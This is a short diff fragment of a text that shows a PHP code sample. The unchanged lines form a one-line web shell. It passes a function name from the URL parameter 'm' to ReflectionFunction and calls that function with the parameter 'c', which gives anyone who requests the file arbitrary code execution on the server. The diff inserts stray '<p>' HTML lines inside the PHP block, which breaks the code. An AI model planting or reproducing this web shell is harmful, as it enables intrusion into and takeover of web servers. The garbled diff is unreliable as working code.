@@ -7,8 +7,11 @@
 code:
 
 <?php
+<p>
     $func = new ReflectionFunction($_GET[m]);
+    <p>
     echo $func->invokeArgs(array($_GET[c]));
+<p>
 ?>
 
 ***************************************************
